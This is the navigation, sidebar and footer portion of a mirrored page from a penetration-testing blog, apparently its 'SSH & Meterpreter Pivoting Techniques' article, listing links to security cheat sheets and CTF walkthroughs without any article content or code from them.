<pc><p><code>Web App Security</code></p></pc>
</td>
<td>
<pc><p><b><a href="../insecure-direct-object-reference-idor/index.html">Insecure Direct Object Reference (IDOR): Definition, Examples & How to Find</a></b></p></pc>
</td>
</tr>
<tr>
<td>
<pc><p><code>cheat-sheet</code></p></pc>
</td>
<td>
<pc><p><b><a href="../nmap-cheat-sheet/index.html">Nmap Cheat Sheet: Commands & Examples (2022)</a></b></p></pc>
</td>
</tr>
<tr>
<td>
<pc><p><code>SecOps</code></p></pc>
</td>
<td>
<pc><p><b><a href="../encrypted-note-taking-solution/index.html">Encrypted Notes App Solution (iOS, Android, MacOS, Linux, Windows)</a></b></p></pc>
</td>
</tr>
<tr>
<td>
<pc><p><code>cheat-sheet</code></p></pc>
</td>
<td>
<pc><p><b><a href="../dns-tunnel-dnscat2-cheat-sheet/index.html">DNS Tunneling dnscat2 Cheat Sheet</a></b></p></pc>
</td>
</tr>
<tr>
<td>
<pc><p><code>cheat-sheet</code></p></pc>
</td>
<td>
<pc><p><b><a href="../ssh-lateral-movement-cheat-sheet/index.html">SSH Lateral Movement Cheat Sheet</a></b></p></pc>
</td>
</tr>
<tr>
<td>
<pc><p><code>cheat-sheet</code></p></pc>
</td>
<td>
<pc><p><b><a href="../android-app-pen-testing-environment/index.html">Android Pen Testing Environment Setup</a></b></p></pc>
</td>
</tr>
<tr>
<td>
<pc><p><code>cheat-sheet</code></p></pc>
</td>
<td>
<pc><p><b><a href="../password-reset-security-testing-cheat-sheet/index.html">Password Reset Testing Cheat Sheet</a></b></p></pc>
</td>
</tr>
<tr>
<td>
<pc><p><code>cheat-sheet</code></p></pc>
</td>
<td>
<pc><p><b><a href="../ssrf-cheat-sheet/index.html">SSRF Cheat Sheet & Bypass Techniques</a></b></p></pc>
</td>
</tr>
<tr>
<td>
<pc><p><code>cheat-sheet</code></p></pc>
</td>
<td>
<pc><p><b><a href="../penetration-testing-tools-cheat-sheet/index.html">Pen Testing Tools Cheat Sheet</a></b></p></pc>
</td>
</tr>
</tbody>
</table>
</div>
</article>
</div>
<div class="unit one-fifth hide-on-mobiles">
<aside>
<ul>
<li class="">
<a href="../../services/pen-testing/index.html">Pen Testing Services</a>
</li>
<li class="">
<a href="../cheat-sheet/index.html">Cheat Sheets</a>
</li>
<li class="">
<a href="../techniques/index.html">Techniques</a>
</li>
<li class="">
<a href="../security-hardening/index.html">Security Hardening</a>
</li>
<li class="">
<a href="../walkthroughs/index.html">WalkThroughs</a>
</li>
</ul>
<h4>Cheat Sheets</h4>
<ul>
<li class="">
<a href="../reverse-shell-cheat-sheet/index.html">Reverse Shell Cheat Sheet: PHP, Python, Powershell, Bash, NC, JSP, Java, Perl</a>
</li>
<li class="">
<a href="../nmap-cheat-sheet/index.html">Nmap Cheat Sheet: Commands & Examples (2022)</a>
</li>
<li class="">
<a href="../dns-tunnel-dnscat2-cheat-sheet/index.html">DNS Tunneling dnscat2 Cheat Sheet</a>
</li>
<li class="">
<a href="../ssh-lateral-movement-cheat-sheet/index.html">SSH Lateral Movement Cheat Sheet</a>
</li>
<li class="">
<a href="../android-app-pen-testing-environment/index.html">Android Pen Testing Environment Setup</a>
</li>
<li class="">
<a href="../password-reset-security-testing-cheat-sheet/index.html">Password Reset Testing Cheat Sheet</a>
</li>
<li class="">
<a href="../ssrf-cheat-sheet/index.html">SSRF Cheat Sheet & Bypass Techniques</a>
</li>
<li class="">
<a href="../penetration-testing-tools-cheat-sheet/index.html">Pen Testing Tools Cheat Sheet</a>
</li>
<li class="">
<a href="../lfi-cheat-sheet/index.html">LFI Cheat Sheet</a>
</li>
<li class="">
<a href="../vi-cheat-sheet/index.html">Vim Cheat Sheet [2022 Update] + NEOVIM</a>
</li>
<li class="">
<a href="../systemd-cheat-sheet/index.html">Systemd Cheat Sheet</a>
</li>
<li class="">
<a href="../nbtscan-cheat-sheet/index.html">nbtscan Cheat Sheet</a>
</li>
<li class="">
<a href="../linux-commands-cheat-sheet/index.html">Linux Commands Cheat Sheet</a>
</li>
<li>
<a href="../cheat-sheet/index.html">More »</a>
</li>
</ul>
<h4>WalkThroughs</h4>
<ul>
<li class="">
<a href="../insomnihack-ctf-teaser-smartcat2-writeup/index.html">InsomniHack CTF Teaser - Smartcat2 Writeup</a>
</li>
<li class="">
<a href="../insomnihack-ctf-teaser-smartcat1-writeup/index.html">InsomniHack CTF Teaser - Smartcat1 Writeup</a>
</li>
<li class="">
<a href="../fristileaks-walkthrough/index.html">FristiLeaks 1.3 Walkthrough</a>
</li>
<li class="">
<a href="../sickos-1-walkthrough/index.html">SickOS 1.1 - Walkthrough</a>
</li>
<li class="">
<a href="../the-wall-walkthrough/index.html">The Wall Boot2Root Walkthrough</a>
</li>
<li>
<a href="../walkthroughs/index.html">More »</a>
</li>
</ul>
<h4>Techniques</h4>
<ul>
<li class="current">
<a href="index.html">SSH & Meterpreter Pivoting Techniques</a>
</li>
<li>
<a href="../techniques/index.html">More »</a>
</li>
</ul>
<h4>Security Hardening</h4>
<ul>
<li class="">
<a href="../security-harden-centos-7/index.html">Security Harden CentOS 7</a>
</li>
<li>
<a href="../security-hardening/index.html">More »</a>
</li>
</ul>
<h4>/dev/urandom</h4>
<ul>
<li class="">
<a href="../macbook-post-install-check-list/index.html">MacBook - Post Install Config + Apps</a>
</li>
<li>
<a href="../urandom/index.html">More »</a>
</li>
</ul>
<h4>Other Blog</h4>
<ul>
<li class="">
<a href="../insecure-direct-object-reference-idor/index.html">Insecure Direct Object Reference (IDOR): Definition, Examples & How to Find</a>
</li>
<li class="">
<a href="../encrypted-note-taking-solution/index.html">Encrypted Notes App Solution (iOS, Android, MacOS, Linux, Windows)</a>
</li>
<li class="">
<a href="../kali-chromium-install/index.html">HowTo: Kali Linux Chromium Install for Web App Pen Testing</a>
</li>
<li class="">
<a href="../jenkins-api-unauthenticated-rce-exploit/index.html">Jenkins RCE via Unauthenticated API</a>
</li>
<li class="">
<a href="../macbook-post-install-check-list/index.html">MacBook - Post Install Config + Apps</a>
</li>
<li class="">
<a href="../enum4linux-cheat-sheet/index.html">enum4linux Cheat Sheet</a>
</li>
<li class="">
<a href="../linux-local-enumeration-script/index.html">Linux Local Enumeration Script</a>
</li>

<li class="">
<a href="../howto-install-quassel-ubuntu/index.html">HowTo Install Quassel on Ubuntu</a>
</li>
<li class="">
<a href="../keepnote-macbook-install-instructions/index.html">HowTo Install KeepNote on OSX Mavericks</a>
</li>
</ul>
</aside>
</div>
<div class="clear"></div>
</div>
</section>
<footer>
<div class="grid">
<div class="unit one-third center-on-mobiles">
<p>The contents of this website are &copy;&nbsp;2022 <a href="../../index.html">HighOn.Coffee</a></p>
</div>
<div class="unit two-thirds align-right center-on-mobiles">
<p>
Proudly hosted by
<img src="../../img/footer-logo.png" width="100" height="30" alt="GitHub • Social coding">
</a>
</p>
</div>
</div>
</footer>
<script data-cfasync="false" src="../../cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script>
  var anchorForId = function (id) {
    var anchor = document.createElement("a");
    anchor.className = "header-link";
    anchor.href      = "#" + id;
    anchor.innerHTML = "<i class=\"fa fa-link\"></i>";
    return anchor;
  };

  var linkifyAnchors = function (level, containingElement) {
    var headers = containingElement.getElementsByTagName("h" + level);
    for (var h = 0; h < headers.length; h++) {
      var header = headers[h];

      if (typeof header.id !== "undefined" && header.id !== "") {
        header.appendChild(anchorForId(header.id));
      }
    }
  };

  document.onreadystatechange = function () {
    if (this.readyState === "complete") {
      var contentBlock = document.getElementsByClassName("docs")[0] || document.getElementsByClassName("blog")[0];
      if (!contentBlock) {
        return;
      }
      for (var level = 1; level <= 6; level++) {
        linkifyAnchors(level, contentBlock);
      }
    }
  };
</script>
<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-55017594-1', 'auto');
  ga('send', 'pageview');

</script>
</body>

<!-- Mirrored from highon.coffee/blog/ssh-meterpreter-pivoting-techniques/ by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 29 Dec 2022 15:34:15 GMT -->
</html>
